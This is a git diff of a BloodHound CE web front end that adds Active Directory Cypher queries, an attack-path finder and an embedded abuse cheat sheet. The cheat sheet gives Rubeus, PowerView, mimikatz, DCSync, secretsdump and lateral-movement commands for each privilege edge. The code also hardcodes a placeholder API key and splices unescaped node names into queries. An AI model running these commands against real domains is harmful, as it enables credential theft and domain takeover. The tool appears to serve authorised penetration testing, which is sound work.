+                        <h3 style="color: #60a5fa; font-size: 0.875rem; margin: 0 0 0.5rem 0; font-family: 'JetBrains Mono', 'Courier New', monospace;">📋 SharpHound Collection</h3>
+                        <p style="color: #6b7280; font-size: 0.75rem; margin: 0;">Common data collection commands for Active Directory enumeration</p>
                     </div>
 
                     <div class="sharphound-section">
-                        <h3>📋 SharpHound Collection Commands</h3>
-
                         <div class="command-label">Single Domain Collection (Basic)</div>
                         <div class="command-block">SharpHound.exe -c All</div>
 
@@ -447,36 +1102,19 @@
 
                         <div class="command-label">All Domains in Forest</div>
                         <div class="command-block">SharpHound.exe -c All --CollectAllProperties --SearchForest</div>
-
-                        <div class="command-label">Stealth Collection (Loop)</div>
-                        <div class="command-block">SharpHound.exe -c All --Stealth --Loop --Loopduration 24:00:00</div>
-
-                        <div class="command-label">Session Collection Only</div>
-                        <div class="command-block">SharpHound.exe -c Session --Loop --Loopduration 02:00:00</div>
-
-                        <div class="command-label">Custom LDAP Filter</div>
-                        <div class="command-block">SharpHound.exe -c All --LdapFilter "(adminCount=1)"</div>
-
-                        <div class="command-label">Exclude Domain Controllers</div>
-                        <div class="command-block">SharpHound.exe -c All --ExcludeDCs</div>
-                    </div>
-
-                    <div class="info-banner">
-                        <strong>💡 Getting Started:</strong> Select a query from the sidebar to view its details and run it against your BloodHound data. Make sure you've uploaded SharpHound data to BloodHound CE first.
                     </div>
                 </div>
+            </div>
 
-                <div id="query-section" style="display: none;">
-                    <div class="content-header">
-                        <h1 class="content-title" id="content-title">Select a query</h1>
-                        <span class="content-badge" id="content-badge">Category</span>
+            <!-- Right Panel: Cypher Queries -->
+            <div class="bh-results-panel">
+                <div id="query-section">
+                    <div class="content-header" style="margin-bottom: 1rem;">
+                        <h1 class="content-title" id="content-title" style="font-size: 1.25rem;">📊 Pre-Built Queries</h1>
+                        <span class="content-badge" id="content-badge">Select from sidebar</span>
                     </div>
 
-                    <div class="info-banner" id="query-description">
-                        Query description will appear here
-                    </div>
-
-                    <div class="code-block">
+                    <div class="code-block" style="margin-top: 0;">
                         <div class="code-header">
                             <span class="code-lang">Cypher Query</span>
                             <div class="code-actions">
@@ -488,12 +1126,14 @@
                                 </button>
                             </div>
                         </div>
-                        <div class="code-content" id="query-code">
-                            SELECT query FROM sidebar
-                        </div>
+                        <textarea id="query-code" style="width: 100%; min-height: 120px; background: #000; border: none; color: #60a5fa; font-family: 'JetBrains Mono', 'Courier New', monospace; font-size: 0.875rem; padding: 1rem; resize: vertical; outline: none;" placeholder="// Select a query from the sidebar or write your own Cypher query here..."></textarea>
                     </div>
 
-                    <div class="results-section" id="results-section" style="display: none;">
+                    <div class="info-banner" id="query-description" style="margin-top: 1rem;">
+                        👈 Select a query from the sidebar to view its details and execute it against your BloodHound data
+                    </div>
+
+                    <div class="results-section" id="results-section" style="display: none; margin-top: 1.5rem;">
                         <div class="results-header">Query Results</div>
                         <div id="results-content"></div>
                     </div>
@@ -547,7 +1187,20 @@
 
             // Infrastructure
             { name: "Domain Controllers", category: "Infrastructure", description: "List all domain controllers in the forest", cypher: "MATCH (dc:Computer) WHERE dc.name CONTAINS 'DC' OR dc.name CONTAINS 'DOMAIN' RETURN dc.name as DomainController, dc.operatingsystem as OS, dc.enabled as Enabled ORDER BY dc.name" },
-            { name: "Foreign Group Membership", category: "Infrastructure", description: "Find cross-domain group memberships", cypher: "MATCH (u)-[:MemberOf]->(g:Group) WHERE NOT u.domain = g.domain RETURN u.name as User, u.domain as UserDomain, g.name as Group, g.domain as GroupDomain LIMIT 100" }
+            { name: "Foreign Group Membership", category: "Infrastructure", description: "Find cross-domain group memberships", cypher: "MATCH (u)-[:MemberOf]->(g:Group) WHERE NOT u.domain = g.domain RETURN u.name as User, u.domain as UserDomain, g.name as Group, g.domain as GroupDomain LIMIT 100" },
+
+            // Domain Trusts
+            { name: "All Domain Trusts", category: "Domain Trusts", description: "List all trust relationships between domains", cypher: "MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) RETURN d1.name as SourceDomain, type(r) as TrustType, d2.name as TargetDomain, r.trusttype as TrustAttributes, r.sidfiltering as SIDFiltering ORDER BY d1.name" },
+            { name: "Bidirectional Trusts", category: "Domain Trusts", description: "Find domains with bidirectional trust relationships", cypher: "MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain), (d2)-[:TrustedBy]->(d1) RETURN DISTINCT d1.name as Domain1, d2.name as Domain2 ORDER BY d1.name" },
+            { name: "One-Way Incoming Trusts", category: "Domain Trusts", description: "Find domains that trust this domain (incoming)", cypher: "MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain) WHERE NOT (d2)-[:TrustedBy]->(d1) RETURN d1.name as TrustingDomain, d2.name as TrustedDomain ORDER BY d1.name" },
+            { name: "One-Way Outgoing Trusts", category: "Domain Trusts", description: "Find domains that this domain trusts (outgoing)", cypher: "MATCH (d1:Domain)-[:TrustedBy]->(d2:Domain) WHERE NOT (d2)-[:TrustedBy]->(d1) RETURN d2.name as TrustedDomain, d1.name as TrustingDomain ORDER BY d2.name" },
+            { name: "Forest Trusts", category: "Domain Trusts", description: "Find trust relationships between forests", cypher: "MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) WHERE r.trusttype CONTAINS 'Forest' OR r.isTransitive = true RETURN d1.name as Domain1, d2.name as Domain2, r.trusttype as TrustType ORDER BY d1.name" },
+            { name: "External Trusts", category: "Domain Trusts", description: "Find external domain trusts (non-forest)", cypher: "MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) WHERE r.trusttype CONTAINS 'External' OR r.isTransitive = false RETURN d1.name as SourceDomain, d2.name as ExternalDomain, r.sidfiltering as SIDFiltering ORDER BY d1.name" },
+            { name: "Trusts Without SID Filtering", category: "Domain Trusts", description: "Find trusts vulnerable to SID history attacks (no SID filtering)", cypher: "MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain) WHERE r.sidfiltering = false RETURN d1.name as SourceDomain, d2.name as TargetDomain, r.trusttype as TrustType ORDER BY d1.name" },
+            { name: "Cross-Domain Admins", category: "Domain Trusts", description: "Find users from trusted domains with admin rights", cypher: "MATCH (u:User)-[:MemberOf*1..]->(g:Group) WHERE u.domain <> g.domain AND g.admincount = true RETURN u.name as User, u.domain as UserDomain, g.name as AdminGroup, g.domain as GroupDomain ORDER BY u.name LIMIT 100" },
+            { name: "Foreign Security Principals", category: "Domain Trusts", description: "Find foreign security principals (FSPs) from trusted domains", cypher: "MATCH (u:User) WHERE u.name CONTAINS 'S-1-5-21' OR u.distinguishedname CONTAINS 'ForeignSecurityPrincipals' RETURN u.name as FSP, u.domain as Domain, u.distinguishedname as DN ORDER BY u.name LIMIT 100" },
+            { name: "Cross-Trust Attack Paths", category: "Domain Trusts", description: "Find attack paths across domain trusts to high-value targets", cypher: "MATCH p=shortestPath((u:User)-[*1..]->(n)) WHERE u.domain <> n.domain AND (n.highvalue = true OR n.admincount = true) WITH u, n, length(p) as PathLength RETURN u.name as StartUser, u.domain as StartDomain, n.name as Target, labels(n) as TargetType, n.domain as TargetDomain, PathLength ORDER BY PathLength LIMIT 25" },
+            { name: "Domains in Environment", category: "Domain Trusts", description: "List all domains in the Active Directory environment", cypher: "MATCH (d:Domain) RETURN d.name as Domain, d.description as Description, d.functionallevel as FunctionalLevel ORDER BY d.name" }
         ];
 
         let currentQuery = null;
@@ -596,24 +1249,24 @@
                 }
             });
 
-            document.getElementById('welcome-section').style.display = 'none';
-            document.getElementById('query-section').style.display = 'block';
             document.getElementById('content-title').textContent = query.name;
             document.getElementById('content-badge').textContent = query.category;
             document.getElementById('query-description').innerHTML = `<strong>Description:</strong> ${query.description}`;
-            document.getElementById('query-code').textContent = query.cypher;
+            document.getElementById('query-code').value = query.cypher;
             document.getElementById('results-section').style.display = 'none';
         }
 
         // Copy query
         function copyQuery() {
-            if (!currentQuery) return;
-            navigator.clipboard.writeText(currentQuery.cypher);
+            const queryText = document.getElementById('query-code').value.trim();
+            if (!queryText) return;
+
+            navigator.clipboard.writeText(queryText);
 
             const btn = event.target;
             const originalText = btn.textContent;
             btn.textContent = '✓ Copied!';
-            btn.style.color = '#10b981';
+            btn.style.color = '#60a5fa';
             setTimeout(() => {
                 btn.textContent = originalText;
                 btn.style.color = '';
@@ -622,7 +1275,20 @@
 
         // Run query
         async function runQuery() {
-            if (!currentQuery) return;
+            const queryText = document.getElementById('query-code').value.trim();
+            if (!queryText) {
+                const resultsContent = document.getElementById('results-content');
+                resultsContent.innerHTML = '<div class="error-banner"><strong>Error:</strong> Please enter a query</div>';
+                document.getElementById('results-section').style.display = 'block';
+                return;
+            }
+
+            if (!currentDatabase) {
+                const resultsContent = document.getElementById('results-content');
+                resultsContent.innerHTML = '<div class="error-banner"><strong>Error:</strong> Please select a database first</div>';
+                document.getElementById('results-section').style.display = 'block';
+                return;
+            }
 
             const resultsSection = document.getElementById('results-section');
             const resultsContent = document.getElementById('results-content');
@@ -631,13 +1297,21 @@
             resultsContent.innerHTML = '<div class="info-banner">⏳ Running query...</div>';
 
             try {
+                // Apply engagement filter
+                const engagementId = currentDatabase.database_name;
+                const modifiedQuery = injectEngagementFilter(queryText, engagementId);
+
+                console.log('Original query:', queryText);
+                console.log('Modified query:', modifiedQuery);
+                console.log('Engagement ID:', engagementId);
+
                 const response = await fetch('http://192.168.1.7:5000/api/custom-query', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                         'X-API-Key': 'change_me_in_production'
                     },
-                    body: JSON.stringify({ query: currentQuery.cypher })
+                    body: JSON.stringify({ query: modifiedQuery })
                 });
 
                 if (!response.ok) {
@@ -684,10 +1358,9 @@
                     <div class="error-banner">
                         <strong>⚠ Error:</strong> ${error.message}<br><br>
                         <strong>Troubleshooting:</strong><br>
-                        • Ensure BloodHound CE is running at http://192.168.1.7:8080<br>
                         • Verify the API is accessible at http://192.168.1.7:5000<br>
-                        • Make sure you've uploaded SharpHound data<br><br>
-                        <a href="http://192.168.1.7:8080/ui/login" target="_blank" class="upload-link">Open BloodHound CE UI →</a> |
+                        • Select an engagement from the dropdown above<br>
+                        • Ensure you've uploaded BloodHound data using the upload section<br><br>
                         <a href="http://192.168.1.7:7474" target="_blank" class="upload-link">Open Neo4j Browser →</a>
                     </div>
                 `;
@@ -705,6 +1378,485 @@
 
         // Initialize
         renderSidebar();
+        // Get detailed abuse information for edge types
+        function getAbuseInfo(edgeType) {
+            const abuseData = {
+                'AllowedToAct': {
+                    summary: 'Resource-Based Constrained Delegation (RBCD) - Can impersonate any user to this computer',
+                    details: `<strong>Requirements:</strong><br>
+• Controlled account MUST have a Service Principal Name (SPN) set<br>
+• Access to plaintext password or RC4_HMAC hash<br>
+• Target users cannot be in "Protected Users" group<br><br>
+<strong>Exploitation Steps:</strong><br>
+1. Hash the password to RC4_HMAC format:<br>
+<code>Rubeus.exe hash /password:Summer2018!</code><br><br>
+2. Use Rubeus s4u module to get a service ticket:<br>
+<code>Rubeus.exe s4u /user:WEB05$ /rc4:EF266C6B963C0BB683941941173A4E1F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER /ptt</code><br><br>
+3. Access file system with injected ticket:<br>
+<code>dir \\\\TARGETCOMPUTER\\c$</code>`
+                },
+                'WriteDacl': {
+                    summary: 'Can modify permissions on target object - Grant yourself additional rights',
+                    details: `<strong>PowerView Exploitation:</strong><br>
+1. Create credential object:<br>
+<code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force<br>
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\username', $SecPassword)</code><br><br>
+2. Grant GenericAll to yourself:<br>
+<code>Add-DomainObjectAcl -Credential $Cred -TargetIdentity "TARGET" -Rights All</code><br><br>
+3. Abuse the new rights (reset password, add to group, etc.)<br><br>
+4. Cleanup:<br>
+<code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity "TARGET" -Rights All</code>`
+                },
+                'GenericAll': {
+                    summary: 'Full control over target object - Multiple attack paths available',
+                    details: `<strong>Against User:</strong><br>
+• Force password reset:<br>
+<code>Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)</code><br><br>
+• Targeted Kerberoast - Add fake SPN:<br>
+<code>Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}<br>
+Get-DomainUser targetuser | Get-DomainSPNTicket | Export-Clixml tickets.xml</code><br><br>
+<strong>Against Group:</strong><br>
+<code>Add-DomainGroupMember -Identity 'Domain Admins' -Members targetuser</code><br><br>
+<strong>Against Computer:</strong><br>
+• Read LAPS password: <code>Get-DomainComputer TARGETCOMP -Properties ms-mcs-admpwd</code>`
+                },
+                'GenericWrite': {
+                    summary: 'Write access to most object properties',
+                    details: `<strong>Targeted Kerberoast Attack:</strong><br>
+1. Set fake SPN on target:<br>
+<code>Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='nonexistent/fakespn'}</code><br><br>
+2. Request ticket and crack:<br>
+<code>Get-DomainUser targetuser | Get-DomainSPNTicket | Export-Clixml ticket.xml<br>
+hashcat -m 13100 ticket.txt wordlist.txt</code><br><br>
+<strong>Against Computer:</strong><br>
+• Modify msDS-AllowedToActOnBehalfOfOtherIdentity for RBCD`
+                },
+                'WriteOwner': {
+                    summary: 'Can change object owner - Take ownership then modify permissions',
+                    details: `<strong>Exploitation:</strong><br>
+1. Take ownership:<br>
+<code>Set-DomainObjectOwner -Identity targetobject -OwnerIdentity controlleduser</code><br><br>
+2. Grant yourself rights:<br>
+<code>Add-DomainObjectAcl -TargetIdentity targetobject -PrincipalIdentity controlleduser -Rights All</code><br><br>
+3. Abuse new privileges (reset password, add to group, etc.)`
+                },
+                'ForceChangePassword': {
+                    summary: 'Can reset password without knowing current credentials',
+                    details: `<strong>PowerView Method (Quieter than net.exe):</strong><br>
+1. Create credential object:<br>
+<code>$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force<br>
+$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\attacker', $SecPassword)</code><br><br>
+2. Reset target password:<br>
+<code>$NewPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force<br>
+Set-DomainUserPassword -Identity targetuser -AccountPassword $NewPassword -Credential $Cred</code>`
+                },
+                'AdminTo': {
+                    summary: 'Local administrator access - Execute code and dump credentials',
+                    details: `<strong>Lateral Movement:</strong><br>
+• PSExec: <code>psexec.exe \\\\COMPUTER cmd.exe</code><br>
+• WMI: <code>wmic /node:COMPUTER process call create "cmd.exe"</code><br>
+• WinRM: <code>Enter-PSSession -ComputerName COMPUTER</code><br><br>
+<strong>Credential Theft:</strong><br>
+<code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"</code><br><br>
+<strong>LAPS Password:</strong><br>
+<code>Get-DomainComputer COMPUTER -Properties ms-mcs-admpwd</code>`
+                },
+                'ReadLAPSPassword': {
+                    summary: 'Can read Local Administrator Password Solution (LAPS) password',
+                    details: `<strong>PowerView:</strong><br>
+<code>Get-DomainComputer TARGETCOMPUTER -Properties ms-mcs-admpwd</code><br><br>
+<strong>LDAP Query:</strong><br>
+<code>Get-ADComputer TARGETCOMPUTER -Properties ms-mcs-admpwd | select name,ms-mcs-admpwd</code><br><br>
+<strong>CrackMapExec:</strong><br>
+<code>crackmapexec ldap DCIP -u username -p password --kdcHost DCIP -M laps</code>`
+                },
+                'GetChangesAll': {
+                    summary: 'DCSync rights - Replicate password hashes including krbtgt',
+                    details: `<strong>Mimikatz DCSync:</strong><br>
+<code>mimikatz.exe "lsadump::dcsync /domain:DOMAIN.COM /user:Administrator" "exit"</code><br><br>
+<strong>Impacket secretsdump:</strong><br>
+<code>secretsdump.py DOMAIN/username:password@DC_IP</code><br><br>
+<strong>Dump All Hashes:</strong><br>
+<code>mimikatz.exe "lsadump::dcsync /domain:DOMAIN.COM /all /csv" "exit"</code>`
+                },
+                'CanRDP': {
+                    summary: 'Can use Remote Desktop Protocol - Remote access for credential theft',
+                    details: `<strong>Connect via RDP:</strong><br>
+<code>mstsc /v:TARGETCOMPUTER</code><br><br>
+<strong>xfreerdp (Linux):</strong><br>
+<code>xfreerdp /u:username /p:password /v:TARGETCOMPUTER /cert-ignore</code><br><br>
+<strong>Post-Exploitation:</strong><br>
+• Dump credentials from memory with Mimikatz<br>
+• Search for sensitive files<br>
+• Pivot to other systems`
+                },
+                'CanPSRemote': {
+                    summary: 'Can use PowerShell Remoting - Execute commands remotely',
+                    details: `<strong>Interactive Session:</strong><br>
+<code>Enter-PSSession -ComputerName TARGETCOMPUTER -Credential $cred</code><br><br>
+<strong>Execute Command:</strong><br>
+<code>Invoke-Command -ComputerName TARGETCOMPUTER -ScriptBlock {whoami} -Credential $cred</code><br><br>
+<strong>Evil-WinRM:</strong><br>
+<code>evil-winrm -i TARGETCOMPUTER -u username -p password</code>`
+                },
+                'ExecuteDCOM': {
+                    summary: 'Can execute DCOM - Lateral movement without PS Remoting',
+                    details: `<strong>MMC20.Application:</strong><br>
+<code>$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGETCOMPUTER"))<br>
+$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c powershell.exe","Minimized")</code>`
+                },
+                'AddMember': {
+                    summary: 'Can add members to this group',
+                    details: `<strong>PowerView:</strong><br>
+<code>Add-DomainGroupMember -Identity 'TargetGroup' -Members 'controlleduser'</code><br><br>
+<strong>net.exe (Noisier):</strong><br>
+<code>net group "TargetGroup" controlleduser /add /domain</code><br><br>
+<strong>Verification:</strong><br>
+<code>Get-DomainGroupMember -Identity 'TargetGroup'</code>`
+                }
+            };
+
+            // Return detailed info if available, otherwise return basic summary
+            return abuseData[edgeType] || {
+                summary: edgeType,
+                details: 'No detailed abuse information available for this relationship type.'
+            };
+        }
+
+        // Load users and computers for path finding
+        async function loadPathNodes() {
+            if (!currentDatabase) {
+                document.getElementById('path-from').innerHTML = '<option value="">Select an engagement first...</option>';
+                document.getElementById('path-to').innerHTML = '<option value="">Select an engagement first...</option>';
+                return;
+            }
+
+            const fromSelector = document.getElementById('path-from');
+            const toSelector = document.getElementById('path-to');
+
+            fromSelector.innerHTML = '<option value="">Loading...</option>';
+            toSelector.innerHTML = '<option value="">Loading...</option>';
+
+            try {
+                const engagementId = currentDatabase.database_name;
+
+                // Query to get users, computers, and groups
+                const query = `
+                    MATCH (n)
+                    WHERE (n:User OR n:Computer OR n:Group)
+                    RETURN n.name as name, labels(n) as type
+                    ORDER BY type, name
+                `;
+
+                const modifiedQuery = injectEngagementFilter(query, engagementId);
+
+                const response = await fetch(`${API_BASE}/api/custom-query`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-Key': API_KEY
+                    },
+                    body: JSON.stringify({ query: modifiedQuery })
+                });
+
+                const data = await response.json();
+
+                if (response.ok && Array.isArray(data) && data.length > 0) {
+                    // Populate FROM dropdown
+                    fromSelector.innerHTML = '<option value="">-- Any / Not specified --</option>';
+                    data.forEach(node => {
+                        const option = document.createElement('option');
+                        option.value = node.name;
+                        let typeLabel = '📦';
+                        if (node.type.includes('User')) typeLabel = '👤';
+                        else if (node.type.includes('Computer')) typeLabel = '💻';
+                        else if (node.type.includes('Group')) typeLabel = '👥';
+                        option.textContent = `${typeLabel} ${node.name}`;
+                        fromSelector.appendChild(option);
+                    });
+
+                    // Populate TO dropdown with nodes + special targets
+                    toSelector.innerHTML = '<option value="">-- Any / Not specified --</option>';
+
+                    // Add special high-value targets
+                    const hvtGroup = document.createElement('optgroup');
+                    hvtGroup.label = 'High-Value Targets';
+                    const daOpt = document.createElement('option');
+                    daOpt.value = '__DA__';
+                    daOpt.textContent = '🎯 Domain Admins Groups';
+                    const dcOpt = document.createElement('option');
+                    dcOpt.value = '__DC__';
+                    dcOpt.textContent = '💻 Domain Controllers';
+                    const hvtOpt = document.createElement('option');
+                    hvtOpt.value = '__HVT__';
+                    hvtOpt.textContent = '⭐ All High Value Targets';
+                    hvtGroup.appendChild(daOpt);
+                    hvtGroup.appendChild(dcOpt);
+                    hvtGroup.appendChild(hvtOpt);
+                    toSelector.appendChild(hvtGroup);
+
+                    // Add all nodes
+                    const nodesGroup = document.createElement('optgroup');
+                    nodesGroup.label = 'Specific Nodes';
+                    data.forEach(node => {
+                        const option = document.createElement('option');
+                        option.value = node.name;
+                        let typeLabel = '📦';
+                        if (node.type.includes('User')) typeLabel = '👤';
+                        else if (node.type.includes('Computer')) typeLabel = '💻';
+                        else if (node.type.includes('Group')) typeLabel = '👥';
+                        option.textContent = `${typeLabel} ${node.name}`;
+                        nodesGroup.appendChild(option);
+                    });
+                    toSelector.appendChild(nodesGroup);
+                } else {
+                    fromSelector.innerHTML = '<option value="">No nodes found</option>';
+                    toSelector.innerHTML = '<option value="">No nodes found</option>';
+                }
+            } catch (error) {
+                console.error('Failed to load nodes:', error);
+                fromSelector.innerHTML = '<option value="">Failed to load nodes</option>';
+                toSelector.innerHTML = '<option value="">Failed to load nodes</option>';
+            }
+        }
+
+        // Interactive Path Query
+        async function runPathQuery() {
+            if (!currentDatabase) {
+                alert('Please select an engagement first');
+                return;
+            }
+
+            const fromNode = document.getElementById('path-from').value.trim();
+            const toNode = document.getElementById('path-to').value.trim();
+
+            // Validate: at least one must be specified
+            if (!fromNode && !toNode) {
+                alert('Please select at least one node (FROM or TO)');
+                return;
+            }
+
+            const resultsDiv = document.getElementById('path-results');
+            const engagementId = currentDatabase.database_name;
+            let query;
+            let description;
+
+            // Build query based on FROM/TO combinations
+            if (fromNode && toNode) {
+                // Both specified: find path between specific nodes
+
+                // Check for special targets
+                if (toNode === '__DA__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target:Group))
+                             WHERE source.name = "${fromNode}"
+                             AND target.name =~ '(?i).*DOMAIN ADMINS.*'
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 10`;
+                    description = `${fromNode} → Domain Admins`;
+                } else if (toNode === '__DC__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target:Computer))
+                             WHERE source.name = "${fromNode}"
+                             AND target.name =~ '(?i).*DC.*'
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 10`;
+                    description = `${fromNode} → Domain Controllers`;
+                } else if (toNode === '__HVT__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target))
+                             WHERE source.name = "${fromNode}"
+                             AND target.highvalue = true
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 10`;
+                    description = `${fromNode} → High Value Targets`;
+                } else {
+                    // Specific node to specific node
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target))
+                             WHERE source.name = "${fromNode}"
+                             AND target.name = "${toNode}"
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 5`;
+                    description = `${fromNode} → ${toNode}`;
+                }
+            } else if (fromNode && !toNode) {
+                // Only FROM specified: find outbound paths from this node
+                query = `MATCH p=shortestPath((source)-[*1..6]->(target))
+                         WHERE source.name = "${fromNode}"
+                         AND NOT source = target
+                         AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                         AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                         RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                         ORDER BY PathLength LIMIT 25`;
+                description = `Outbound paths from ${fromNode}`;
+            } else {
+                // Only TO specified: find inbound paths to this node
+
+                // Check for special targets
+                if (toNode === '__DA__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target:Group))
+                             WHERE target.name =~ '(?i).*DOMAIN ADMINS.*'
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 25`;
+                    description = `All paths to Domain Admins`;
+                } else if (toNode === '__DC__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target:Computer))
+                             WHERE target.name =~ '(?i).*DC.*'
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 25`;
+                    description = `All paths to Domain Controllers`;
+                } else if (toNode === '__HVT__') {
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target))
+                             WHERE target.highvalue = true
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 25`;
+                    description = `All paths to High Value Targets`;
+                } else {
+                    // Inbound to specific node
+                    query = `MATCH p=shortestPath((source)-[*1..6]->(target))
+                             WHERE target.name = "${toNode}"
+                             AND NOT source = target
+                             AND ALL(node IN nodes(p) WHERE node.engagement_id = "${engagementId}")
+                             AND ALL(rel IN relationships(p) WHERE rel.engagement_id = "${engagementId}")
+                             RETURN nodes(p) as PathNodes, relationships(p) as PathEdges, length(p) as PathLength
+                             ORDER BY PathLength LIMIT 25`;
+                    description = `Inbound paths to ${toNode}`;
+                }
+            }
+
+            resultsDiv.style.display = 'block';
+            resultsDiv.innerHTML = '<div class="info-banner">⏳ Searching for paths...</div>';
+
+            try {
+                console.log('Path query:', query);
+
+                const response = await fetch(`${API_BASE}/api/custom-query`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-Key': API_KEY
+                    },
+                    body: JSON.stringify({ query: query })
+                });
+
+                const data = await response.json();
+
+                if (!response.ok) {
+                    resultsDiv.innerHTML = `<div class="error-banner">❌ Error: ${data.error || 'Query failed'}</div>`;
+                    return;
+                }
+
+                if (!Array.isArray(data) || data.length === 0) {
+                    resultsDiv.innerHTML = `<div class="empty-state" style="padding: 2rem; text-align: center; color: #6b7280;">
+                        <div style="margin-bottom: 0.5rem;">No paths found</div>
+                        <div style="font-size: 0.75rem; color: #4b5563;">${description}</div>
+                    </div>`;
+                    return;
+                }
+
+                // Render paths with detailed visualization
+                let pathsHTML = `<div style="color: #60a5fa; font-size: 0.875rem; margin-bottom: 1rem; font-weight: 600;">
+                    Found ${data.length} path${data.length > 1 ? 's' : ''}: ${description}
+                </div>`;
+
+                data.forEach((pathData, idx) => {
+                    const nodes = pathData.PathNodes;
+                    const edges = pathData.PathEdges;
+                    const pathLength = pathData.PathLength;
+
+                    pathsHTML += `
+                        <div style="background: #1a1a1a; border: 1px solid #2a2a2a; border-radius: 0.5rem; padding: 1rem; margin-bottom: 1rem;">
+                            <div style="color: #9ca3af; font-size: 0.75rem; margin-bottom: 0.75rem; font-weight: 600;">
+                                Path ${idx + 1} (${pathLength} hop${pathLength > 1 ? 's' : ''})
+                            </div>
+                            <div style="display: flex; flex-direction: column; gap: 0.5rem;">
+                    `;
+
+                    // Render each step in the path
+                    for (let i = 0; i < nodes.length; i++) {
+                        const node = nodes[i];
+                        const nodeName = node.name || node.properties?.name || 'Unknown';
+                        const nodeLabels = node.labels || [];
+                        const nodeType = nodeLabels[0] || 'Node';
+
+                        // Node icon
+                        let icon = '📦';
+                        if (nodeType === 'User') icon = '👤';
+                        else if (nodeType === 'Computer') icon = '💻';
+                        else if (nodeType === 'Group') icon = '👥';
+                        else if (nodeType === 'Domain') icon = '🌐';
+                        else if (nodeType === 'GPO') icon = '⚙️';
+                        else if (nodeType === 'OU') icon = '📁';
+
+                        pathsHTML += `
+                            <div style="display: flex; align-items: center; gap: 0.5rem;">
+                                <span style="font-size: 1.25rem;">${icon}</span>
+                                <div>
+                                    <div style="color: #f3f4f6; font-size: 0.875rem; font-weight: 500;">${nodeName}</div>
+                                    <div style="color: #6b7280; font-size: 0.6875rem;">${nodeType}</div>
+                                </div>
+                            </div>
+                        `;
+
+                        // Show relationship arrow if not last node
+                        if (i < edges.length) {
+                            const edge = edges[i];
+                            const edgeType = edge.type || 'Unknown';
+                            const abuseInfo = getAbuseInfo(edgeType);
+                            const detailId = `abuse-detail-${idx}-${i}`;
+
+                            pathsHTML += `
+                                <div style="margin-left: 1.5rem; padding: 0.75rem; background: #0a0a0a; border-left: 2px solid #3b82f6; border-radius: 0.25rem;">
+                                    <div style="color: #60a5fa; font-size: 0.75rem; font-weight: 600; margin-bottom: 0.25rem;">
+                                        ↓ ${edgeType}
+                                    </div>
+                                    ${abuseInfo.summary ? `
